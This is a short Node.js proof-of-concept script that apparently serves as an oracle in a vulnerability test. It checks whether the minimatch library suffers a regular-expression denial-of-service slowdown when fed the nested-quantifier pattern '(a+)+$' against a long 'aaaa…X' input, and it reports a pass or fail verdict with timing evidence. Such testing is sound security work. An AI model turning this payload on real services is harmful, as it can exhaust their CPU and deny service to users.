const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function nowMs() {
  return Number(process.hrtime.bigint() / 1000000n);
}

function timeCalls(fn, rounds) {
  const start = nowMs();
  for (let i = 0; i < rounds; i++) fn();
  return nowMs() - start;
}

function emit() {
  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: !!operation_completed,
    exploit_succeeded: !!exploit_succeeded,
    evidence: String(evidence)
  }));
}

try {
  const benign = minimatch('file.txt', '*.txt');
  if (benign !== true) {
    throw new Error('benign_call_failed');
  }

  operation_completed = true;

  const attackPath = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaX';
  const attackPattern = '(a+)+$';
  const controlPattern = '^a+$';

  // warmup
  minimatch(attackPath, attackPattern);
  minimatch(attackPath, controlPattern);

  const attackRounds = 12;
  const controlRounds = 1200;

  const tControl = timeCalls(() => minimatch(attackPath, controlPattern), controlRounds);
  const tAttack = timeCalls(() => minimatch(attackPath, attackPattern), attackRounds);

  const perControl = tControl / controlRounds;
  const perAttack = tAttack / attackRounds;
  const ratio = perControl > 0 ? (perAttack / perControl) : (perAttack > 0 ? 9999 : 1);
  const deltaPerCall = perAttack - perControl;

  if ((ratio >= 80 && deltaPerCall >= 2) || (tAttack >= 300 && ratio >= 20)) {
    exploit_succeeded = true;
    evidence = 'redos_slowdown_detected:control_ms=' + tControl + ',attack_ms=' + tAttack + ',control_rounds=' + controlRounds + ',attack_rounds=' + attackRounds + ',per_control_ms=' + perControl.toFixed(4) + ',per_attack_ms=' + perAttack.toFixed(4) + ',ratio=' + ratio.toFixed(2) + ',delta_per_call_ms=' + deltaPerCall.toFixed(4);
  } else {
    exploit_succeeded = false;
    evidence = 'no_material_slowdown:control_ms=' + tControl + ',attack_ms=' + tAttack + ',control_rounds=' + controlRounds + ',attack_rounds=' + attackRounds + ',per_control_ms=' + perControl.toFixed(4) + ',per_attack_ms=' + perAttack.toFixed(4) + ',ratio=' + ratio.toFixed(2) + ',delta_per_call_ms=' + deltaPerCall.toFixed(4);
  }
} catch (err) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup_or_benign_failure:' + ((err && err.message) ? err.message : String(err));
}

emit();